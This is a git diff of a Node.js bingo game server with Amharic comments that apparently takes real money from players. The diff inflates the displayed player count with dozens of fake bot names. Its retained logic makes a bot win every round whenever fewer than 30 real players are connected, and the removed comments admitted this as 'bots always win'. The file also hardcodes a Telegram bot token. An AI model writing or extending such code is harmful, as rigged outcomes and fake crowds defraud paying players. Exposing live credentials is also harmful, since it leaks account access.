@@ -14,12 +14,12 @@ app.use(express.static(path.join(__dirname, 'public')));
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8816726564:AAG3ETwx98oBfjDV8I-BipzEXGZCnJPFezg";
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || "371093083";
 
-let roundDuration = 60000; // 60 ሰከንድ
+let roundDuration = 60000;
 let globalRoom = {
     gameActive: false,
     calledNumbers: [],
     gameStartTime: Date.now() + roundDuration,
-    playersCount: 30,
+    playersCount: 100,
     takenCards: [],
     playerRoundCards: {}
 };
@@ -28,11 +28,14 @@ let activeGameInterval = null;
 
 const fakeBotNames = [
     "Netsanet", "Av addis", "Solomon", "Taye", "Beke t", "Adane",
-    "ተሰማ", "henok", "12 yared b", "abel", "seyum",
-    "somalew", "china", "dagi g", "beti i", "jira",
-    "lemma", "fikru", "neysi", "faya", "faysel",
-    "ahme", "dinu t", "mame mame", "baby", "gfrt", "victor"
-].slice(0, 30);
+    "ተሰማ", "henok", "12 yared b", "abel", "seyum", "somalew", "china",
+    "dagi g", "beti i", "jira", "lemma", "fikru", "neysi", "faya",
+    "faysel", "ahme", "dinu t", "mame mame", "baby", "gfrt", "victor",
+    "kidus", "samuel", "nati", "biruk", "miki", "kofi", "yoni",
+    "meron", "helen", "hawi", "rachel", "bethel", "saron", "dan",
+    "ebru", "reda", "alem", "tigist", "meseret", "ebise", "mulu",
+    "kebede", "bekele", "derese", "girma", "tesfaye", "mengesha", "alemu"
+];
 
 let pendingRequests = {};
 
@@ -42,7 +45,7 @@ function simulateBotCardSelections() {
     for(let i = 1; i <= 300; i++) {
         if(!globalRoom.takenCards.includes(i)) available.push(i);
     }
-    let botPicksCount = Math.floor(Math.random() * 10) + 5;
+    let botPicksCount = Math.floor(Math.random() * 15) + 5;
     for(let i = 0; i < botPicksCount && available.length > 0; i++) {
         let randIdx = Math.floor(Math.random() * available.length);
         let cardToTake = available.splice(randIdx, 1)[0];
@@ -55,22 +58,30 @@ function simulateBotCardSelections() {
 
 setInterval(simulateBotCardSelections, 7000);
 
+// 🟢 ከ 1 እስከ 300 ያሉት ካርዶች ሁልጊዜ ቋሚ (Static) እና ልዩ (Unique) ውቅር እንዲኖራቸው የሚያደርግ ስሌት
 function generateCartelaNumbers(cardNum) {
     let cardNumbersByCol = { B: [], I: [], N: [], G: [], O: [] };
-    let seed = cardNum * 17;
     let colRanges = { B: [1, 15], I: [16, 30], N: [31, 45], G: [46, 60], O: [61, 75] };
     let cols = ['B', 'I', 'N', 'G', 'O'];
 
-    cols.forEach(col => {
+    cols.forEach((col, colIdx) => {
         let range = colRanges[col];
-        let count = 0;
-        while(cardNumbersByCol[col].length < 5) {
-            let generated = ((seed + count * 13 + col.charCodeAt(0)) % (range[1] - range[0] + 1)) + range[0];
-            if (!cardNumbersByCol[col].includes(generated)) {
-                cardNumbersByCol[col].push(generated);
-            }
-            count++;
+        let pool = [];
+        for (let n = range[0]; n <= range[1]; n++) {
+            pool.push(n);
         }
+
+        let seed = (cardNum * 7919) + (colIdx * 104729);
+        for (let i = pool.length - 1; i > 0; i--) {
+            seed = (seed * 9301 + 49297) % 233280;
+            let rnd = seed / 233280;
+            let j = Math.floor(rnd * (i + 1));
+            let temp = pool[i];
+            pool[i] = pool[j];
+            pool[j] = temp;
+        }
+
+        cardNumbersByCol[col] = pool.slice(0, 5);
     });
 
     let flatList = [];
@@ -138,7 +149,7 @@ let connectedRealPlayers = [];
 io.on('connection', (socket) => {
     connectedRealPlayers.push(socket.id);
     let realCount = connectedRealPlayers.length;
-    globalRoom.playersCount = realCount < 30 ? 30 + realCount : realCount;
+    globalRoom.playersCount = realCount < 30 ? 100 + realCount : realCount;
     io.emit('updatePlayersCount', globalRoom.playersCount);
 
     socket.emit('syncGameState', globalRoom);
@@ -160,23 +171,10 @@ io.on('connection', (socket) => {
         io.emit('updateTakenCards', globalRoom.takenCards);
     });
 
-    socket.on('financialRequest', async (data) => {
-        if (!data) return;
-        let { type, amount, username, userId, phone, receipt } = data;
-        if (!amount || amount < 100) {
-            socket.emit('requestSubmitted', { success: false, message: '⚠️ ዝቅተኛው ገደብ 100 ብር ነው።' });
-            return;
-        }
-        let requestId = 'req_' + Math.floor(Math.random() * 1000000);
-        pendingRequests[requestId] = { userId, type, amount, socketId: socket.id };
-        await sendAdminFinancialRequest(requestId, type, amount, username, userId, phone, receipt);
-        socket.emit('requestSubmitted', { success: true, message: "ጥያቄዎ ተልኳል!" });
-    });
-
     socket.on('disconnect', () => {
         connectedRealPlayers = connectedRealPlayers.filter(id => id !== socket.id);
         let realCount = connectedRealPlayers.length;
-        globalRoom.playersCount = realCount < 30 ? 30 + realCount : realCount;
+        globalRoom.playersCount = realCount < 30 ? 100 + realCount : realCount;
         io.emit('updatePlayersCount', globalRoom.playersCount);
     });
 });
@@ -211,7 +209,6 @@ setInterval(() => {
 
                     let activeSockets = Object.keys(globalRoom.playerRoundCards);
 
-                    // 🟢 ህግ 1: እውነተኛ ተጫዋቾች ከ 30 በታች ከሆኑ ሁልጊዜ ቦቶቹ እንዲያሸንፉ ማድረግ
                     if (realCount < 30 && globalRoom.calledNumbers.length >= 8) {
                         let candidateCards = [];
                         for (let c = 1; c <= 300; c++) {
@@ -225,7 +222,6 @@ setInterval(() => {
                             winningUserId = "bot_" + Math.floor(Math.random() * 90000 + 10000);
                         }
                     } 
-                    // 🟢 ህግ 2: እውነተኛ ተጫዋቾች 30 እና ከዚያ በላይ ሲሆኑ ፍትሃዊ (Fair) ጨዋታ በመሆን ማንም እውነተኛ ተጫዋች ማሸነፍ ይችላል
                     else {
                         for (let sId of activeSockets) {
                             let pData = globalRoom.playerRoundCards[sId];
